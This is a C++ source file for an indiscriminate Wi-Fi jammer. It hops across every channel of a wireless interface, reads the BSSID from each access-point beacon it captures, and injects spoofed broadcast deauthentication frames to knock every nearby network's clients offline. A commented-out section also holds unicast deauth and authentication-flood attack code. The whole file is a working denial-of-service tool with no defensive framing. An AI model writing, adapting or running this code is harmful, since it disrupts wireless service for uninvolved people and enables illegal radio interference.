#include "ieee80211_h.h"
#include <stdio.h>
#include "iwlib.h"
#include <thread>
#define BEACON 0x0080
#define QOS 0x0088
#define RTOS 0x00b4
#define BACK 0x0094
#define PROVRS 0x0050
#define PROVRQ 0x0040
#define DATA 0x0008
#define NULLF 0x0048
#define TYPEMASK 0x00FF
//Flags
#define FROMAP 0x0200
#define TOAP 0x0100
#define FLAGMASK 0xFF00
//LEN
#define RADIOLEN 2
#define BEACONLEN 24
#define PROVRSLEN 24
#define FIXLEN 12
#define BBSID 16
//Tag
#define RSN 48
#define IWERR_GET_EXT		-7
#define IWERR_ARG_TYPE		-3
#define IWERR_SET_EXT		-6
struct MacFormat{
    u_int8_t src[6];
    u_int8_t dst[6];
    u_int8_t bssid[6];
};
struct BeaconFrame{
//    struct RadioHeader rHeader;
    u_int16_t fc;//Frame Control
    u_int16_t duration;
    u_int8_t detAdd[6];
    u_int8_t srcAdd[6];
    u_int8_t bssId[6];
    u_int16_t seqNum;//Fragment Num(4) + Seq Num(12)
    //IEEE 80211 Mangment Field
}__attribute__((packed));


struct ParsData{
    u_int16_t rH_len;
    u_int16_t fc;
    u_int16_t flags;
    u_int8_t apMac[6];
    u_int32_t total_len;
    u_int16_t frame_len; 
};

int *my_chan;
static int	errarg;
struct ParsData pData;
struct MacFormat mac_f;
u_int8_t bssid[6];
int chan_num = 0;
int chan_total_num;
pcap_t* pcap;

int parsing(struct ParsData *pData,const u_char *buf,struct pcap_pkthdr * header)
{
    memcpy(&pData->rH_len,&buf[RADIOLEN],2);
    memcpy(&pData->fc,&buf[pData->rH_len],2);
    memcpy(&pData->total_len,&header->len,4);
    pData->frame_len = pData->total_len - pData->rH_len;
    pData->flags = pData->fc & FLAGMASK;
    pData->fc &= TYPEMASK;
    return 0;
}
u_int8_t par_chan(const u_char *buf,struct ParsData pData){
    //printf("len = %d\n",pData.rH_len);
    //printf("total len = %d\n",pData.total_len);
    //printf("frame len = %d\n",pData.frame_len);
    int tag_len = pData.frame_len - BEACONLEN - FIXLEN - 4;
    int tag_start = pData.rH_len + BEACONLEN + FIXLEN;
    //printf("start = %d\n",tag_start);
    //printf("tag len = %d\n",tag_len);
    u_int8_t temp;
    for(int i = 0; i < tag_len ;){
        memcpy(&temp,&buf[i+tag_start],1);    
        //printf("para = %.2x \n",temp);
        
        if(temp == 3)
        {
            u_int8_t ret;
            memcpy(&ret,&buf[i+tag_start+2],1);
            //printf("channel = %d\n",ret);
            return ret;
        }
        u_int8_t para_size;
        memcpy(&para_size,&buf[tag_start + 1 + i],1);
        //printf("para size = %.2x \n",para_size);
        i += para_size;// + para LEN
        i +=2;//para + len_len
        //printf("i size = %d \n",i);

    }

    return 0;
}
static int
print_freq_info(int		skfd,
		char *		ifname,
		char *		args[],		/* Command line args */
		int		count)		/* Args count */
{
  struct iwreq		wrq;
  struct iw_range	range;
  double		freq;
  int			k;
  int			channel;
  char			buffer[128];	/* Temporary buffer */

  /* Avoid "Unused parameter" warning */
  args = args; count = count;

  /* Get list of frequencies / channels */
  if(iw_get_range_info(skfd, ifname, &range) < 0)
      fprintf(stderr, "%-8.16s  no frequency information.\n\n",
		      ifname);
  else
    {
      if(range.num_frequency > 0)
	{
        my_chan = (int*)malloc(sizeof(int)*range.num_channels);
        chan_total_num = range.num_channels;
	  //printf("%-8.16s  %d channels in total; available frequencies :\n",
//		 ifname, range.num_channels);
	  /* Print them all */
	  for(k = 0; k < range.num_frequency; k++)
	    {
	      freq = iw_freq2float(&(range.freq[k]));
	      iw_print_freq_value(buffer, sizeof(buffer), freq);
	      //printf("          Channel %.2d : %s\n",
	//	     range.freq[k].i, buffer);
          my_chan[k] = range.freq[k].i;
	    }
	}
      else
	//printf("%-8.16s  %d channels\n",
	  //     ifname, range.num_channels);

      /* Get current frequency / channel and display it */
      if(iw_get_ext(skfd, ifname, SIOCGIWFREQ, &wrq) >= 0)
	{
	  freq = iw_freq2float(&(wrq.u.freq));
	  channel = iw_freq_to_channel(freq, &range);
	  iw_print_freq(buffer, sizeof(buffer),
			freq, channel, wrq.u.freq.flags);
	 // printf("          Current %s\n\n", buffer);
	}
    }
  return(0);
}
static int
set_freq_info(int		skfd,
	      char *		ifname,
	      char *		args[],		/* Command line args */
	      int		count)		/* Args count */
{
  struct iwreq		wrq;
  int			i = 1;

  if(!strcasecmp(args[0], "auto"))
    {
      wrq.u.freq.m = -1;
      wrq.u.freq.e = 0;
      wrq.u.freq.flags = 0;
    }
  else
    {
      if(!strcasecmp(args[0], "fixed"))
	{
	  /* Get old frequency */
	  if(iw_get_ext(skfd, ifname, SIOCGIWFREQ, &wrq) < 0)
	    return(IWERR_GET_EXT);
	  wrq.u.freq.flags = IW_FREQ_FIXED;
	}
      else			/* Should be a numeric value */
	{
	  double		freq;
	  char *		unit;

	  freq = strtod(args[0], &unit);
	  if(unit == args[0])
	    {
	      errarg = 0;
	      return(IWERR_ARG_TYPE);
	    }
	  if(unit != NULL)
	    {
	      if(unit[0] == 'G') freq *= GIGA;
	      if(unit[0] == 'M') freq *= MEGA;
	      if(unit[0] == 'k') freq *= KILO;
	    }

	  iw_float2freq(freq, &(wrq.u.freq));

	  wrq.u.freq.flags = IW_FREQ_FIXED;

	  /* Check for an additional argument */
	  if((i < count) && (!strcasecmp(args[i], "auto")))
	    {
	      wrq.u.freq.flags = 0;
	      ++i;
	    }
	  if((i < count) && (!strcasecmp(args[i], "fixed")))
	    {
	      wrq.u.freq.flags = IW_FREQ_FIXED;
	      ++i;
	    }
	}
    }

  if(iw_set_ext(skfd, ifname, SIOCSIWFREQ, &wrq) < 0)
    return(IWERR_SET_EXT);

  /* Var args */
  return(i);
}
int get_chan(int argc, char* argv[]){

        int skfd;
        char *dev = argv[1];
        char **args;
        args = argv + 3;
        int count = 0;

        if((skfd = iw_sockets_open())<0){
                perror("socket");
                return -1;
        }
        print_freq_info(skfd,dev,args,count);
        return 0;
}
int set_chan(int argc,char* argv[]){
        int skfd;
        char *dev = argv[1];
        char **args;
        if((skfd = iw_sockets_open())<0){
                perror("socket");
                return -1;
        }
        while(1)
        {
            printf("Hello set chan\n");
            sleep(1);
            args = argv + 3;
            int count = 0;
            sprintf(argv[3],"%d",my_chan[chan_num % chan_total_num]);
            chan_num++; 
            set_freq_info(skfd,dev,args,count);
        }
        return 0;
}

struct Para para;

void usage() {
	printf("syntax: wifi-jammer <interface>\n");
}
typedef struct {
        char* dev_;
} Param;
Param param  = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 2) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	
    return true;
}
void send_deauth(u_int8_t * bssid){
   char t_buf[BUFSIZ];
   memcpy(t_buf,DEAUTH_REQ,26+13);
   memcpy(&t_buf[13+4+6],bssid,6);
   memcpy(&t_buf[13+4+6+6],bssid,6);
   pcap_sendpacket(pcap,reinterpret_cast<const u_char*>(t_buf),26+13);
}
int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

    int bit = 0;
	char errbuf[PCAP_ERRBUF_SIZE];
    char frame_buf[BUFSIZ];
	pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
    char **t_argv;
    t_argv = (char **)malloc(sizeof(char*)*3);
    t_argv[0] = (char*)malloc(sizeof(char)*4096);
    t_argv[1] = (char*)malloc(sizeof(char)*4096);
    t_argv[2] = (char*)malloc(sizeof(char)*4096);
    //t_argv[3] = (char*)malloc(sizeof(char)*4096);
    strcpy(t_argv[0],"iwlist");
    strcpy(t_argv[1],argv[1]);
    strcpy(t_argv[2],"channel");
    //sprintf(t_argv[3],"%d",chan);
    get_chan(3,t_argv);
    //set_chan(4,t_argv);
    free(t_argv[0]);
    free(t_argv[1]);
    free(t_argv[2]);
    free(t_argv);
    ///////////////////
    t_argv = (char **)malloc(sizeof(char*)*4);
    t_argv[0] = (char*)malloc(sizeof(char)*4096);
    t_argv[1] = (char*)malloc(sizeof(char)*4096);
    t_argv[2] = (char*)malloc(sizeof(char)*4096);
    t_argv[3] = (char*)malloc(sizeof(char)*4096);
    strcpy(t_argv[0],"iwconfig");
    strcpy(t_argv[1],argv[1]);
    strcpy(t_argv[2],"channel");

    std::thread* t = new std::thread(set_chan,4,t_argv); 
    t->detach();

    while (true) {//rec packet
        printf("hi\n");
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("\npcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
        parsing(&pData,packet,header);
        int chan;
        if(pData.fc == BEACON){
            printf("Hello Becon\n");
            if((chan= par_chan(packet,pData))==0){//fail get channel
                continue;
            }

            memcpy(&bssid,&packet[pData.rH_len + 16],6);
            printf("%.2x",bssid[0]);
            printf("%.2x",bssid[1]);
            printf("%.2x",bssid[2]);
            printf("%.2x",bssid[3]);
            printf("%.2x",bssid[4]);
            printf("%.2x\n",bssid[5]);

            for(int i=0;i<10;i++){
                send_deauth(bssid);
            }
        }
    }
/*
    while(1)
    {
        if(para.pbit[1] == 1){//if auth Attack
            memcpy(frame_buf,AUTH_REQ,43);
            memcpy(&frame_buf[13+4],&para.ap,6);
            memcpy(&frame_buf[13+4+6],&para.sta,6);
            memcpy(&frame_buf[13+4+6+6],&para.ap,6);
            pcap_sendpacket(pcap,reinterpret_cast<const u_char*>(frame_buf),43);
            for(int i=0; i < 26;i++){
                printf("%.2x",(unsigned int)frame_buf[i]);
            }
            printf("\n");
        }else{//if deauth Attack
            if(para.pbit[0] == 1){// ucast
                memcpy(frame_buf,DEAUTH_REQ,26+13);
                if(bit == 0){//ap -> sta
                    bit = 1; 
                    memcpy(&frame_buf[13+4],&para.sta,6);
                    memcpy(&frame_buf[13+4+6],&para.ap,6);
                    memcpy(&frame_buf[13+4+6+6],&para.ap,6);
                }else{//sta->ap
                    bit = 0; 
                    memcpy(&frame_buf[13+4],&para.ap,6);
                    memcpy(&frame_buf[13+4+6],&para.sta,6);
                    memcpy(&frame_buf[13+4+6+6],&para.ap,6);
                }
                for(int i=0; i < 26;i++){
                    printf("%.2x",(unsigned int)frame_buf[i]);
                }
            	printf("\n");
            }else{//bcast
                memcpy(frame_buf,DEAUTH_REQ,26+13);
                memcpy(&frame_buf[13+4+6],&para.ap,6);
                memcpy(&frame_buf[13+4+6+6],&para.ap,6);
            }
            pcap_sendpacket(pcap,reinterpret_cast<const u_char*>(frame_buf),26+13);
        }
        //send packet
        sleep(0.1);
    }
    */
    free(my_chan);
	pcap_close(pcap);
}
